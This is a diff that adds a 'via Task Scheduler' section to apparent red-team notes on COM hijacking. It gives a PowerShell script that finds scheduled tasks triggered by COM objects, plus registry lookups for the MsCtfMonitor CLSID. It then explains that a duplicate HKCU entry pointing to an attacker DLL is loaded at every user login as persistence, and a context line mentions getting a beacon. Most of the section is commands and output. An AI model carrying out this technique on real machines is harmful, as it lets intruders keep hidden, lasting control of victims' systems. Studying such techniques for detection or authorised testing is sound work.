@@ -29,9 +29,79 @@ PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB890
 
 If this was the victim machine, you have to drop the dll in the box. When the dll loads, you should get a beacon. 
 
-## 📔 Description
+## 📔 via Task Scheduler
 
-- 
+Another great place to look for hijackable COM components is in the Task Scheduler. Rather than executing binaries on disk, many of the default Windows Tasks actually use Custom Triggers to call COM objects. And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered. We can use the following PowerShell to find compatible tasks.
+```
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+```
+
+  
+
+This script is rather self-explanatory and should produce an output similar to the following:
+```
+Task Name:  SystemSoundsService
+Task Path:  \Microsoft\Windows\Multimedia\
+CLSID:  {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
+
+Task Name:  MsCtfMonitor
+Task Path:  \Microsoft\Windows\TextServicesFramework\
+CLSID:  {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
+
+```
+
+  
+If we view the _MsCtfMonitor_ task in the Task Scheduler, we can see that it's triggered when any user logs in.  This would act as an effective reboot-persistence.
+
+  
+
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/host-persistence/MsCtfMonitor.png)
+
+  
+
+Lookup the current implementation of {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} in _HKEY_CLASSES_ROOT\CLSID_**.**
+```
+PS C:\> Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+
+Name           Property
+----           --------
+InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
+               ThreadingModel : Both
+
+  
+```
+
+We can see it's another InprocServer32 (like in process monitor section above) and we can verify that it's currently implemented in HKLM and not HKCU.
+```
+PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
+
+Name                                   Property
+----                                   --------
+{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler
+
+
+PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
+```
+  
+Now it's simply a case of adding a duplicate entry into HKCU pointing to our DLL (as process monitor section above), and this will be loaded once every time a user logs in.
 
 ##  📗 Action to perform 
 
